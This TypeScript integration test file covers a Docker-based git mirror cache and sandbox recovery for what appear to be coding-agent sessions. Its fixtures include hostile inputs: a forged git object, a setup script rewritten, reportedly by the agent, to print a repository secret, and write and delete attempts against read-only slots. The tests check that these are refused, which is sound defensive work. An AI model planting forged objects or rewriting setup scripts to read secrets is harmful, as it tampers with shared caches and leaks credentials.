		const a = await box(uid, await admitted(uid));
		const floor = snapshotLimits.free;
		snapshotLimits.free = Number.MAX_SAFE_INTEGER;
		try {
			assert.equal((await clone(a, uid)).hit, false);
		} finally {
			snapshotLimits.free = floor;
		}
		assert.equal(
			(await dockerCli(["exec", "--user", "65534", a.container, "test", "-e", pathOf(uid) + "/repo.git"])).code,
			1,
			"a mirror was saved below the free-space floor",
		);
		expect("no mirror is written below the free-space floor", true);
		await admitted(other);
		assert.equal(
			await mount(uid, "proof", "another-machine", { floor: Number.MAX_SAFE_INTEGER }),
			null,
			"a slot was admitted below the floor",
		);
		assert.equal(
			await inStore(`test ! -e ${slotOf(other)} && test -d ${slotOf(uid)} && echo ok`),
			"ok",
			"disk pressure did not evict the unused slot",
		);
		expect("below the floor no slot is admitted and unused slots are evicted", true);
	},
);

await mirrorSection("mirror: concurrent admission", "mirror-lock", async ({ volume, image, admitted, mount, cli }) => {
	// Admission waits briefly for the store lock instead of failing. Docker would create the
	// store without its labels for the holder, so admit once first.
	const holder = volume + "-lock";
	await admitted("fixtureB");
	try {
		await cli(
			"run",
			"-d",
			"--pull",
			"never",
			"--name",
			holder,
			"--network",
			"none",
			"--mount",
			`type=volume,src=${volume},dst=/store`,
			"--entrypoint",
			"/usr/bin/python3",
			image,
			"-c",
			"import fcntl, os, time\nfd = os.open('/store', os.O_DIRECTORY)\nfcntl.flock(fd, fcntl.LOCK_EX)\nprint('locked', flush=True)\ntime.sleep(2.5)",
		);
		for (let i = 0; !(await cli("logs", holder)).includes("locked"); i++) {
			assert.ok(i < 400);
			await new Promise(r => setTimeout(r, 50));
		}
		assert.ok(await mount("fixtureA"), "admission failed while another admission held the store");
		expect("an admission waits for one in progress", true);
	} finally {
		await dockerCli(["rm", "-f", holder]);
	}
});

await mirrorSection("mirror: a slot a container names", "mirror-named", async ({ admitted, box, repo, store }) => {
	await box("fixtureA", await admitted("fixtureA"));
	// An image that cannot run proves that no allocator container ran.
	assert.ok(
		await gitMirrorMount("wlp-no-such-image:never", "proof", "", "fixtureA", repo, store),
		"a named slot ran the allocator",
	);
	expect("a slot a container already names is mounted without an allocator container", true);
});

await mirrorSection(
	"mirror: eviction around stopped containers",
	"mirror-evict",
	async ({ image, admitted, mount, box, clone, cli, inStore, slotOf, store }) => {
		const uid = "fixtureA",
			other = "fixtureB";
		const a = await box(uid, await admitted(uid));
		assert.equal((await clone(a, uid)).hit, false);
		assert.equal((await clone(a, uid)).hit, true);
		// Stop A while its slot is the least recently used, then fill the store. The slot must
		// survive, and A must start again with its mirror.
		await admitted(other);
		await cli("stop", "-t", "0", a.container);
		const isolated = await box(uid, await admitted(uid, "another-deployment"));
		await startContainer(a.container, image, store);
		assert.equal((await clone(a, uid)).hit, true, "a stopped container's slot was evicted");
		assert.equal(
			await inStore(`test ! -e ${slotOf(other)} && echo gone`),
			"gone",
			"the unused slot was not the victim",
		);
		expect("a slot named by a stopped container survives eviction and its container starts", true);
		// Every slot is named: no victim, no admission.
		assert.equal(await mount(uid, "proof", "another-machine"), null, "a named slot was evicted");
		// A slot admitted moments ago may be about to be mounted.
		await cli("rm", "-f", isolated.container);
		assert.equal(await mount(other, "proof", "", { graceSeconds: 120 }), null, "a just-admitted slot was evicted");
		assert.ok(await mount(other));
		expect("no slot a container names, nor one admitted moments ago, is evicted", true);
	},
);

await mirrorSection(
	"mirror: a start with its slot gone",
	"mirror-restore",
	async ({ image, admitted, box, clone, cli, inStore, slotOf, pathOf, store }) => {
		const uid = "fixtureA",
			path = pathOf(uid);
		const a = await box(uid, await admitted(uid));
		assert.equal((await clone(a, uid)).hit, false);
		// Should a slot go anyway (an older allocator, a hand removal), the start puts it back.
		await cli("stop", "-t", "0", a.container);
		await inStore(`rm -rf -- ${slotOf(uid)}`);
		assert.notEqual((await dockerCli(["start", a.container])).code, 0, "docker started without its subpath");
		await startContainer(a.container, image, store);
		assert.equal(
			await cli("exec", "--user", "65534", a.container, "sh", "-c", `stat -c %u:%a ${path}; ls -A ${path}`),
			"65534:700",
		);
		assert.equal((await clone(a, uid)).hit, false);
		assert.equal((await clone(a, uid)).hit, true);
		expect("a start puts back a missing slot, empty and transport-owned", true);
	},
);

await mirrorSection(
	"mirror: sessions cannot write their slot",
	"mirror-readonly",
	async ({ admitted, box, clone, cli, pathOf, mirrorState }) => {
		const uid = "fixtureA",
			path = pathOf(uid);
		const a = await box(uid, await admitted(uid));
		assert.equal((await clone(a, uid)).hit, false);
		const before = await mirrorState(a, uid);
		for (const user of ["65534", "agent"]) {
			for (const command of [
				["touch", path + "/x"],
				["rm", "-rf", path + "/repo.git"],
				["mv", path + "/repo.git", path + "/y"],
				["touch", path + "/repo.git/objects/info/alternates"],
			]) {
				const tried = await dockerCli(["exec", "--user", user, a.container, ...command]);
				assert.notEqual(tried.code, 0, `${user} could ${command.join(" ")}`);
			}
		}
		assert.match(
			await cli(
				"exec",
				"--user",
				"65534",
				a.container,
				"awk",
				"-v",
				"p=" + path,
				"$5 == p { print $6 }",
				"/proc/self/mountinfo",
			),
			/^ro(,|$)/,
			"the slot is not mounted read-only",
		);
		assert.equal(await mirrorState(a, uid), before);
		expect("neither the transport uid nor the agent can write, rename or remove anything in its slot", true);
	},
);

await mirrorSection(
	"mirror: the save helper rehashes what a session staged",
	"mirror-forge",
	async ({ image, admitted, box, clone, cli, pathOf, mirrorState, fixture }) => {
		const uid = "fixtureA";
		const a = await box(uid, await admitted(uid));
		assert.equal((await clone(a, uid)).hit, false);
		const before = await mirrorState(a, uid);
		// A stage as anything running as the transport uid could leave it: a commit whose blob, under
		// its genuine name, holds other content.
		const staged = async (forge: boolean) => {
			const stage = randomBytes(16).toString("hex");
			await cli(
				"exec",
				"--user",
				"65534",
				"-w",
				"/",
				"-e",
				"FORGE=" + (forge ? "1" : ""),
				a.container,
				"bash",
				"-ec",
				[
					`dir=/tmp/wlp-transport-${stage}.mirror; mkdir -m 700 "$dir"; cd "$dir"`,
					"git init -q --bare seed; export GIT_DIR=seed",
					"blob=$(echo good | git hash-object -w --stdin)",
					"tree=$(printf '100644 blob %s\\tf\\n' \"$blob\" | git mktree)",
					'commit=$(git -c user.name=f -c user.email=f@example.org commit-tree "$tree" -m forged)',
					'echo "$commit refs/heads/main" > seed/packed-refs; echo "ref: refs/heads/main" > seed/HEAD',
					'f="seed/objects/${blob:0:2}/${blob:2}"; chmod u+w "$f"',
					`if [ -n "$FORGE" ]; then python3 -c 'import sys, zlib; sys.stdout.buffer.write(zlib.compress(b"blob 5\\0evil\\n"))' > "$f"; fi`,
					'echo "$commit"',
				].join("\n"),
			);
			return stage;
		};
		assert.equal(
			await saveSessionMirror(a.container, await staged(true), false, { image }),
			false,
			"a forged object was installed",
		);
		assert.equal(await mirrorState(a, uid), before, "a refused save changed the mirror");
		expect("a stage with an object whose content does not match its name is refused and the mirror kept", true);
		const honest = await staged(false);
		assert.equal(
			await saveSessionMirror(a.container, honest, false, { image }),
			true,
			"the helper refused an honest stage",
		);
		assert.notEqual(await mirrorState(a, uid), before);
		assert.equal(
			(await dockerCli(["exec", "--user", "65534", a.container, "test", "-e", `/tmp/wlp-transport-${honest}.mirror`]))
				.code,
			1,
			"the stage was left behind",
		);
		// The next clone's refs differ from that hand-made mirror, and it puts GitHub's back.
		assert.equal((await clone(a, uid)).hit, true);
		assert.equal(
			await cli(
				"exec",
				"--user",
				"65534",
				a.container,
				"git",
				"--git-dir",
				pathOf(uid) + "/repo.git",
				"rev-parse",
				"HEAD",
			),
			standin.branchHead(fixture, "main"),
		);
		expect("the same stage, unforged, is installed and its stage removed", true);
	},
);

await mirrorSection(
	"mirror: the save helper's image, mount, limits and queue",
	"mirror-helper",
	async ({ volume, image, admitted, box, cli, inStore, slotOf, pathOf, store, mirrorState }) => {
		const uid = "fixtureA",
			path = pathOf(uid),
			slot = slotOf(uid);
		await admitted("fixtureB");
		const mounted = await admitted(uid);
		// A session image without python3, as a snapshot committed after setup could be. The helpers
		// must run the base image instead.
		const maker = volume + "-image";
		await cli(
			"run",
			"--pull",
			"never",
			"--name",
			maker,
			"--user",
			"0:0",
			"--network",
			"none",
			image,
			"/bin/sh",
			"-c",
			"rm -f /usr/bin/python3 /usr/bin/python3.*",
		);
		const committed = await cli("commit", "--change", "USER agent", "--change", 'CMD ["sleep", "infinity"]', maker);
		await cli("rm", maker);
		let session: DockerSandboxHandle | undefined;
		try {
			const a = (session = await box(uid, mounted, committed));
			// The same message gives the same commit: the dates are fixed.
			const stage = async (message: string, repair = false) => {
				const id = randomBytes(16).toString("hex");
				await cli(
					"exec",
					"--user",
					"65534",
					"-w",
					"/",
					"-e",
					"GIT_AUTHOR_DATE=@1700000000 +0000",
					"-e",
					"GIT_COMMITTER_DATE=@1700000000 +0000",
					"-e",
					"MSG=" + message,
					a.container,
					"bash",
					"-ec",
					[
						`dir=/tmp/wlp-transport-${id}.mirror; mkdir -m 700 "$dir"; cd "$dir"`,
						"git init -q --bare seed; export GIT_DIR=seed",
						'commit=$(git -c user.name=h -c user.email=h@example.org commit-tree "$(git mktree </dev/null)" -m "$MSG")',
						'echo "$commit refs/heads/main" > seed/packed-refs; echo "ref: refs/heads/main" > seed/HEAD',
						...(repair ? [": > seed/repair"] : []),
					].join("\n"),
				);
				return id;
			};
			const staged = async (id: string) =>
				(await dockerCli(["exec", "--user", "65534", a.container, "test", "-e", `/tmp/wlp-transport-${id}.mirror`]))
					.code === 0;
			const subject = () =>
				cli("exec", "--user", "65534", a.container, "git", "--git-dir", path + "/repo.git", "log", "-1", "--format=%s");
			// An earlier design's suffix-less incoming directory.
			assert.equal(
				await inStore(
					`mkdir ${slot}/incoming && touch ${slot}/incoming/x && chown -R 65534:65534 ${slot}/incoming && echo ok`,
				),
				"ok",
			);
			// A reader holds the slot lock, so the first save waits for it after its fsck.
			await cli("exec", "-d", "--user", "65534", a.container, "flock", "-s", path, "sleep", "20");
			let firstDone = false;
			const first = saveSessionMirror(a.container, await stage("first"), false, { image });
			void first.finally(() => {
				firstDone = true;
			});
			let helper: any;
			for (let i = 0; i < 200 && !helper; i++) {
				const ids = (
					await dockerCli(["ps", "-q", "--filter", "volume=" + volume, "--filter", "name=^wlp-git-save-"])
				).stdout.trim();
				if (ids) [helper] = JSON.parse((await dockerCli(["inspect", ids.split("\n")[0]!])).stdout || "[null]");
				else await new Promise(resolve => setTimeout(resolve, 50));
			}
			assert.ok(helper, "no save helper was seen");
			assert.deepEqual(
				helper.HostConfig.Mounts.map((m: any) => [m.Type, m.Source, m.VolumeOptions?.Subpath, m.Target]),
				[["volume", volume, slot, "/slot"]],
				"the helper mounts more than its slot",
			);
			assert.equal(helper.Mounts.length, 1);
			assert.deepEqual(
				[helper.HostConfig.Memory, helper.HostConfig.MemorySwap],
				[2 ** 30, 2 ** 30],
				"the helper has no memory limit",
			);
			assert.deepEqual(helper.Config.Entrypoint, ["/usr/bin/timeout"], "the helper has no deadline of its own");
			assert.deepEqual(helper.Config.Cmd.slice(0, 6), ["-k", "10s", "540s", "/usr/bin/python3", "-I", "-S"]);
			assert.ok(
				/core\.bigFileThreshold=64m".*core\.deltaBaseCacheLimit=32m".*"fsck", "--full"/s.test(helper.Config.Cmd[7]),
				"fsck runs without memory bounds",
			);
			assert.equal(helper.Image, image, "the helper does not run the base image");
			expect(
				"the save helper runs the base image with only its slot mounted, 1 GiB of memory and its own deadline",
				true,
			);
			// Two more clones stage while the first save waits: the third takes the second's place.
			const second = await stage("second"),
				third = await stage("third");
			const later = [
				saveSessionMirror(a.container, second, false, { image }),
				saveSessionMirror(a.container, third, false, { image }),
			];
			for (let i = 0; i < 100 && (await staged(second)); i++) await new Promise(resolve => setTimeout(resolve, 50));
			assert.ok(!(await staged(second)), "a stage replaced in the queue was kept");
			assert.ok(!firstDone && (await staged(third)), "the queue check ran after the first save");
			assert.deepEqual(await Promise.all([first, ...later]), [true, true, true]);
			assert.equal(await subject(), "third");
			assert.equal(
				await inStore(`test ! -e ${slot}/incoming && echo gone`),
				"gone",
				"a suffix-less incoming directory was left",
			);
			expect(
				"a save waiting for its slot gives way to a later stage, and leftovers of the earlier design are cleared",
				true,
			);
			const before = await mirrorState(a, uid);
			assert.equal(await saveSessionMirror(a.container, await stage("third"), false, { image }), true);
			assert.equal(await mirrorState(a, uid), before, "the helper installed refs the mirror already has");
			assert.equal(await saveSessionMirror(a.container, await stage("third", true), false, { image }), true);
			assert.notEqual(await mirrorState(a, uid), before, "a repair stage was not installed");
			assert.equal(await subject(), "third");
			expect("the helper keeps a mirror whose refs match a stage, unless the clone marked it for repair", true);
			// The restore allocator runs the base image too.
			await cli("stop", "-t", "0", a.container);
			await inStore(`rm -rf -- ${slot}`);
			await startContainer(a.container, image, store);
			assert.equal(await cli("exec", "--user", "65534", a.container, "stat", "-c", "%u:%a", path), "65534:700");
			expect("a start of a session whose image has no python3 still puts back its slot", true);
		} finally {
			if (session) await dockerCli(["rm", "-fv", session.container]);
			await dockerCli(["rmi", committed]);
		}
	},
);

await mirrorSection(
	"mirror: the per-turn sweep right after a clone",
	"mirror-sweep",
	async ({ admitted, box, clone, cli, pathOf, mirrorState, settled, fixture }) => {
		const uid = "fixtureA";
		const a = await box(uid, await admitted(uid));
		assert.equal((await clone(a, uid)).hit, false);
		// New refs: this clone's save replaces the mirror after the clone returns.
		standin.commit(fixture, "main", { "swept.txt": "after" }, "Advance before the sweep");
		const warm = await clone(a, uid, fixture, undefined, false);
		assert.ok(warm.hit);
		await sweepSessionProcesses(a);
		await settled();
		const [, head] = (await mirrorState(a, uid)).split("\n");
		assert.equal(head, standin.branchHead(fixture, "main"), "the save did not survive the sweep");
		assert.equal(
			await cli("exec", "--user", "65534", a.container, "sh", "-c", 'ls -A /tmp | grep -c "^wlp-transport-" || true'),
			"0",
		);
		assert.equal((await clone(a, uid)).hit, true);
		expect("sweeping the session's processes right after a clone leaves the slot a usable, updated repo.git", true);
		// A stage a lost save left behind goes with the next clone.
		await cli(
			"exec",
			"--user",
			"65534",
			a.container,
			"mkdir",
			"-m",
			"700",
			"/tmp/wlp-transport-" + "0".repeat(32) + ".mirror",
		);
		await clone(a, uid);
		assert.equal(
			await cli("exec", "--user", "65534", a.container, "sh", "-c", 'ls -A /tmp | grep -c "^wlp-transport-" || true'),
			"0",
			"a stale stage survived the next clone",
		);
		expect("a stale stage is removed at the start of the next clone", true);
	},
);

await mirrorSection(
	"mirror: unchanged refs are not saved again",
	"mirror-same",
	async ({ admitted, box, clone, mirrorState, seen }) => {
		const uid = "fixtureA";
		const a = await box(uid, await admitted(uid));
		assert.equal((await clone(a, uid)).hit, false);
		const before = await mirrorState(a, uid);
		assert.ok(seen.probeMs >= 10_000, `the mirror probe allows only ${seen.probeMs} ms`);
		assert.equal((await clone(a, uid)).hit, true);
		assert.ok(!seen.staged);
		seen.hideMirror = true;
		try {
			assert.equal((await clone(a, uid)).hit, false);
		} finally {
			seen.hideMirror = false;
		}
		assert.ok(!seen.staged, "a plain clone with the mirror's refs staged a save");
		assert.equal(await mirrorState(a, uid), before, "the mirror was rewritten");
		expect(
			"neither a reference nor a plain clone rewrites a mirror whose refs it matches, and the probe waits 10 s or more",
			true,
		);
	},
);

await mirrorSection(
	"mirror: helpers name no slot",
	"mirror-helpers",
	async ({ volume, image, admitted, box, slotOf, cli }) => {
		const uid = "fixtureA";
		await box(uid, await admitted(uid));
		await admitted("fixtureB");
		// A helper's name (and, from the image, the platform label) with another slot's mount: never
		// inspected, so one can exit at any time.
		const fake = "wlp-git-save-" + randomBytes(6).toString("hex");
		await cli(
			"create",
			"--pull",
			"never",
			"--name",
			fake,
			"--mount",
			`type=volume,src=${volume},volume-subpath=${slotOf("fixtureB")},dst=/x,volume-nocopy`,
			image,
		);
		try {
			const named = await referencedSlots(volume);
			assert.ok(named?.has(slotOf(uid)), "the session's slot was not found");
			assert.equal(named?.size, 1, "a helper-named container was inspected");
		} finally {
			await dockerCli(["rm", "-f", fake]);
		}
		const mounts = JSON.stringify([{ Type: "volume", Source: volume, VolumeOptions: { Subpath: slotOf(uid) } }]);
		assert.deepEqual(
			slotsInInspect({ code: 1, stdout: mounts + "\n", stderr: "Error: No such container: 0123abcd\n" }, volume),
			new Set([slotOf(uid)]),
		);
		assert.equal(
			slotsInInspect({ code: 1, stdout: "", stderr: "Cannot connect to the Docker daemon\n" }, volume),
			null,
		);
		expect("helper containers are not inspected, and a container gone before its inspect names no slot", true);
	},
);

await mirrorSection(
	"mirror-benchmark: a large repository",
	"mirror-large",
	async ({ admitted, box, clone, cli, fixture, allocations }) => {
		// Loose history forces the HTTP server to build a pack as it would after new pushes.
		// Only the last 512 KiB blob is checked out. Every version is in the clone.
		const git = (args: string[], input?: Buffer | string) =>
			execFileSync("git", ["-C", fixture.path, ...args], {
				input,
				encoding: "utf8",
				env: {
					...process.env,
					GIT_AUTHOR_NAME: "fixture",
					GIT_COMMITTER_NAME: "fixture",
					GIT_AUTHOR_EMAIL: "fixture@example.org",
					GIT_COMMITTER_EMAIL: "fixture@example.org",
				},
			}).trim();
		const versions = Number(process.env.WLP_MIRROR_BENCHMARK_VERSIONS ?? 352);
		let parent = git(["rev-parse", "main"]);
		for (let i = 0; i < versions; i++) {
			const blob = git(["hash-object", "-w", "--stdin"], randomBytes(512 * 1024));
			const tree = git(["mktree"], "100644 blob " + blob + "\tpayload\n");
			parent = git(["commit-tree", tree, "-p", parent, "-m", "Version " + i]);
		}
		git(["update-ref", "refs/heads/main", parent]);
		const uid = "benchmark";
		const bench = await box(uid, await admitted(uid));
		const baseline = await clone(bench),
			fill = await clone(bench, uid);
		const trials = [await clone(bench, uid), await clone(bench), await clone(bench, uid)];
		const size = await cli("exec", bench.container, "sh", "-ec", "du -sm .git | cut -f1");
		const timed = async (command: string) => {
			const t = performance.now();
			await cli("exec", bench.container, "sh", "-ec", command);
			return Math.round(performance.now() - t);
		};
		const fsck = {
			full: await timed("git fsck --full --no-dangling --no-progress >/dev/null"),
			connectivity: await timed("git fsck --connectivity-only --no-dangling --no-progress >/dev/null"),
		};
		console.log(
			`${size} MiB fixture clone (ms and HTTP Git bytes)`,
			JSON.stringify({ baseline, fill, warm1: trials[0], plain2: trials[1], warm2: trials[2] }),
		);
		console.log("fsck of that clone (ms)", JSON.stringify(fsck));
		// A busy machine: the local work of a warm clone takes well over the stall deadline,
		// while GitHub answers at once. The mirror must still be used.
		await cli("update", "--cpus", "0.1", bench.container);
		const busy = await clone(bench, uid);
		const busyFsck = await timed("git fsck --full --no-dangling --no-progress >/dev/null");
		await cli("update", "--cpus", "1", bench.container);
		console.log(
			"Warm clone at 0.1 CPU (ms and HTTP Git bytes)",
			JSON.stringify(busy),
			"full fsck there (ms)",
			busyFsck,
		);
		assert.ok(busy.hit, "slow local work made the warm clone fall back");
		assert.ok(busy.ms > 8000, "the throttled clone was too quick to test the deadline");
		console.log("Mirror slot allocation (ms)", JSON.stringify(allocations));
		assert.ok(!fill.hit && fill.tokens === 1, "expected a cold mirror");
		assert.ok(
			trials[0]!.hit && trials[2]!.hit && trials[0]!.bytes < baseline.bytes / 100,
			"the warm clone did not use the mirror",
		);
		assert.ok(
			Math.max(trials[0]!.ms, trials[2]!.ms) < Math.min(baseline.ms, trials[1]!.ms),
			"a warm clone was not faster than a plain one",
		);
		expect(`a warm clone of a ${size} MiB repository uses the mirror and beats a plain clone`, true);
	},
	DOCKER && process.argv.includes("--mirror-benchmark"),
);

// ---------------------------------------------------------------------------------------------
// A sandbox made in place of a lost one
// ---------------------------------------------------------------------------------------------

await section("a replaced sandbox: the workspace goes back on the session's branch", async () => {
	const repository = stored(harbor, adaInstallation);
	const session = "s_feedfacefeedface";
	const branch = naming.branchFor("Keep what was pushed", session);
	const lost = localSandbox("lost");
	await publish.cloneRepository(app, adaConnection, repository, lost);
	writeFileSync(join(lost.cwd, "KEPT.md"), "pushed before the sandbox was lost\n");
	const input = { evidence: NOTHING_VERIFIED, app, connection: adaConnection, repository, sessionId: session, branch };
	const pushed = await publish.publishWork({
		...input,
		sandbox: lost,
		pull: null,
		pushed: null,
		message: { title: "Keep what was pushed", body: "" },
	});
	writeFileSync(join(lost.cwd, "LOST.md"), "never pushed\n");

	const replaced = localSandbox("replaced");
	const cloned = await publish.cloneRepository(app, adaConnection, repository, replaced, undefined, branch);
	const onBase = await replaced.run("git symbolic-ref --short HEAD");
	const head =
		cloned !== false && cloned.workAt !== null ? await publish.putOnWork(replaced, cloned.directory, branch) : null;
	const seen = await replaced.run("git symbolic-ref --short HEAD; git rev-parse HEAD; ls; cat .git/config");
	expect(
		"the clone stays on the base and names the commit GitHub has the session's branch at; put on it, the workspace is there",
		cloned !== false &&
			onBase.stdout === "main\n" &&
			cloned.workAt === pushed.head &&
			head === pushed.head &&
			cloned.workAt === standin.branchHead(harbor, branch) &&
			!cloned.workGone &&
			seen.stdout.startsWith(`${branch}\n${pushed.head}\n`),
		`${onBase.stdout.trim()} | ${seen.stdout.slice(0, 160)}`,
	);
	expect(
		"what was pushed is in it, and what was not is not",
		seen.stdout.includes("KEPT.md") && !seen.stdout.includes("LOST.md"),
	);
	expect("the repository's configuration holds no token", !/x-access-token|ghs_|gh[a-z]_/.test(seen.stdout));
	expect(
		"nothing in it is something GitHub lacks",
		(await publish.hasUnpushedWork(replaced, repository.baseSha ?? null, head)) === false,
	);

	writeFileSync(join(replaced.cwd, "AFTER.md"), "written in the new sandbox\n");
	const next = await publish.publishWork({
		...input,
		sandbox: replaced,
		pull: pushed.pull,
		pushed: head,
		message: { title: "After the replacement", body: "" },
	});
	expect(
		"a push from the new sandbox goes on top of what was there, to the same pull request",
		!next.opened &&
			next.pull.number === pushed.pull.number &&
			standin.lastCommit(harbor, branch).message.startsWith("After the replacement") &&
			standin.fileOn(harbor, branch, "KEPT.md") !== null &&
			standin.fileOn(harbor, branch, "AFTER.md") !== null,
	);

	// A branch someone else pushed to since: the workspace has their commit, and the next push starts from it.
	const other = localSandbox("someone-else");
	const otherClone = await publish.cloneRepository(app, adaConnection, repository, other, undefined, branch);
	if (otherClone !== false) await publish.putOnWork(other, otherClone.directory, branch);
	writeFileSync(join(other.cwd, "THEIRS.md"), "pushed by someone else\n");
	const theirs = await publish.publishWork({
		...input,
		sandbox: other,
		pull: next.pull,
		pushed: next.head,
		message: { title: "Someone else's commit", body: "" },
	});
	const later = localSandbox("replaced-later");
	const caught = await publish.cloneRepository(app, adaConnection, repository, later, undefined, branch);
	const caughtHead = caught !== false ? await publish.putOnWork(later, caught.directory, branch) : null;
	expect(
		"a commit pushed to the branch since is in the workspace, and is what the session counts as pushed",
		caught !== false &&
			caught.workAt === theirs.head &&
			caughtHead === theirs.head &&
			existsSync(join(later.cwd, "THEIRS.md")),
	);

	// The branch deleted at GitHub, as after a merge.
	execFileSync("git", ["update-ref", "-d", `refs/heads/${branch}`], { cwd: harbor.path });
	const after = localSandbox("replaced-gone");
	const gone = await publish.cloneRepository(app, adaConnection, repository, after, undefined, branch);
	const where = await after.run("git symbolic-ref --short HEAD; ls");
	expect(
		"when GitHub no longer has the branch, the workspace stays on the branch the session started from, and the clone says so",
		gone !== false &&
			gone.workAt === null &&
			gone.workGone &&
			where.stdout.startsWith("main\n") &&
			!where.stdout.includes("KEPT.md"),
		where.stdout.slice(0, 120),
	);

	const plain = localSandbox("replaced-first");
	const first = await publish.cloneRepository(app, adaConnection, repository, plain);
	expect(
		"a session that never pushed is cloned as before",
		first !== false && first.workAt === null && !first.workGone,
	);
});

// ---------------------------------------------------------------------------------------------

await section("a replaced sandbox: the setup command runs on the base, never on what the session pushed", async () => {
	const repository = stored(harbor, adaInstallation);
	const session = "s_5e7a95e7a95e7a95";
	const branch = naming.branchFor("Setup on the base", session);
	// The base's setup script, and the branch's, which the agent rewrote to read the setup's secret.
	standin.commit(harbor, "main", { "setup.sh": 'echo "base"\n', ".gitignore": "node_modules/\n" }, "The setup script");
	const first = localSandbox("setup-first");
	await publish.cloneRepository(app, adaConnection, repository, first);
	writeFileSync(join(first.cwd, "setup.sh"), 'echo "branch $CHECK_SETUP_SECRET"\n');
	writeFileSync(join(first.cwd, "BRANCH_ONLY.md"), "only on the branch\n");
	const input = { evidence: NOTHING_VERIFIED, app, connection: adaConnection, repository, sessionId: session, branch };
	const pushed = await publish.publishWork({
		...input,
		sandbox: first,
		pull: null,
		pushed: null,
		message: { title: "Setup on the base", body: "" },
	});

	const replaced = localSandbox("setup-replaced");
	const cloned = await publish.cloneRepository(app, adaConnection, repository, replaced, undefined, branch);
	// As runSetupCommand runs the saved command: in the clone, with the repository's secrets in its environment.
	const setup = await replaced.run("bash ./setup.sh; ls", { env: { CHECK_SETUP_SECRET: "s3cr3t-setup-value-0451" } });
	expect(
		"the setup command runs on the base: it runs main's setup.sh, not the branch's, and the branch's files are not there yet",
		setup.stdout.startsWith("base\n") &&
			!setup.stdout.includes("s3cr3t-setup-value-0451") &&
			!setup.stdout.includes("BRANCH_ONLY.md"),
		setup.stdout.split("\n").slice(0, 2).join(" | "),
	);
	// What a setup does: a tracked file rewritten (a lockfile), an untracked one made (node_modules).
	writeFileSync(join(replaced.cwd, "README.md"), "rewritten by the setup\n");
	mkdirSync(join(replaced.cwd, "node_modules"), { recursive: true });
	writeFileSync(join(replaced.cwd, "node_modules/kept.txt"), "installed\n");
	const head =
		cloned !== false && cloned.workAt !== null
			? await publish.putOnWork(replaced, cloned.directory, branch).catch((error: unknown) => String(error))
			: null;
	const seen = await replaced.run("git symbolic-ref --short HEAD; cat README.md; ls node_modules BRANCH_ONLY.md");
	expect(
		"then the workspace is on the session's branch at the commit GitHub has, the setup's edit to a tracked file gone, its untracked file kept, and nothing counted as unpushed",
		head === pushed.head &&
			seen.stdout.startsWith(`${branch}\n`) &&
			!seen.stdout.includes("rewritten by the setup") &&
			seen.stdout.includes("kept.txt") &&
			seen.stdout.includes("BRANCH_ONLY.md") &&
			(await publish.hasUnpushedWork(replaced, repository.baseSha ?? null, head)) === false,
		`${head} ${pushed.head} | ${seen.stdout.split("\n").join(" | ")}`,
	);
});

await section("replaced subtask sandbox: setup at the seed, then recover the subtask branch", async () => {
	const feature = "windlass/feature-check",
		child = "windlass/child-check";
	const seed = standin.branchHead(harbor, "main")!;
	standin.commit(harbor, feature, { "sibling.txt": "first subtask" }, "Integrate first subtask", "main");
	standin.commit(harbor, child, { "resumed.txt": "second subtask" }, "Push second subtask", feature);
	const repository = stored(harbor, adaInstallation, feature);
	for (const work of [child, "windlass/deleted-child"]) {
		const box = localSandbox("replaced-subtask");
		const cloned = await publish.cloneRepository(app, adaConnection, repository, box, undefined, work, seed);
		expect(
			"setup starts on the feature seed, before either child's changes",
			(await box.run("git rev-parse HEAD")).stdout.trim() === seed && !existsSync(join(box.cwd, "sibling.txt")),
		);
		expect(
			"the publishing base is the independently confirmed feature tip",
			repository.baseSha === standin.branchHead(harbor, feature),
		);
		const branch = work === child ? child : feature;
		expect(
			"restore the published work or fall back to the integrated feature",
			cloned !== false &&
				cloned.workAt === standin.branchHead(harbor, branch) &&
				cloned.workGone === (work !== child) &&
				(await publish.putOnWork(box, cloned.directory, branch)) === cloned.workAt,
		);
	}
	const racing = localSandbox("racing-subtask");
	const original = racing.run.bind(racing);
	racing.run = async (command, options) => {
		const result = await original(command, options);
		if (command.includes("wlp_git clone --quiet"))
			standin.commit(harbor, feature, { "sibling-2.txt": "later" }, "Advance feature");
		return result;
	};
	await publish.cloneRepository(app, adaConnection, repository, racing, undefined, child, seed);
	expect("a feature ref that moved during clone leaves the subtask base unconfirmed", repository.baseSha === null);
});

async function verifyReviewCheckout(box: SandboxHandle) {
	const repository = stored(harbor, adaInstallation);
	const base = standin.branchHead(harbor, "main")!;
	standin.commit(
		harbor,
		`review-fixture-${base.slice(0, 10)}`,
		{ "review.txt": "review me\n" },
		"Head under review",
		"main",
	);
	const head = standin.branchHead(harbor, `review-fixture-${base.slice(0, 10)}`)!;
	execFileSync("git", ["update-ref", "refs/pull/987/head", head], { cwd: harbor.path });
	standin.commit(harbor, "main", { "base-moved": "later" }, "Base moved after pinning");
	const refs = () => execFileSync("git", ["ls-remote", harbor.path], { encoding: "utf8" });
	const before = refs();
	const at = (sha: string) =>
		app.withToken(
			adaInstallation.id,
			{ repositoryId: harbor.id, permissions: { contents: "read", metadata: "read" } },
			token => app.fileAt(token, harbor.owner, harbor.name, "review.txt", sha),
		);
	expect(
		"GitHub supplies the exact contents at the requested commit",
		(await at(head)) === "review me\n" &&
			(await at(base).then(
				() => false,
				() => true,
			)),
	);
	await publish.cloneRepository(app, adaConnection, repository, box, undefined, undefined, base);
	await box.run(
		"mkdir -p node_modules; echo node_modules/ >> .git/info/exclude; git rev-parse HEAD > node_modules/setup-at",
	);
	const fetch = () =>
		app.withToken(
			adaInstallation.id,
			{ repositoryId: harbor.id, permissions: { contents: "read", metadata: "read" } },
			token => checkoutReview(box, app.cloneUrl(harbor.owner, harbor.name), token, ".", 987, head),
			{ revokeAfter: true },
		);
	await fetch();
	const inspect = async (cmd: string) => (await box.run(cmd)).stdout.trim();
	expect(
		"the private diff reports the changed paths from the pinned base",
		JSON.stringify(await changedReviewPaths(box, ".", base, head)) === JSON.stringify(["review.txt"]),
	);
	expect(
		"review setup ran on the pinned base despite branch movement",
		(await inspect("cat node_modules/setup-at")) === base,
	);
	expect(
		"review head is exact and detached",
		(await inspect("git rev-parse HEAD")) === head && (await box.run("git symbolic-ref -q HEAD")).exitCode !== 0,
	);
	await box.run("mkdir -p .wlp-shots; touch .wlp-shots/one.png; echo edited > review.txt");
	await fetch();
	expect(
		"repeat checkout resets edits and removes screenshots",
		(await inspect("cat review.txt")) === "review me" && (await box.run("test ! -e .wlp-shots")).exitCode === 0,
	);
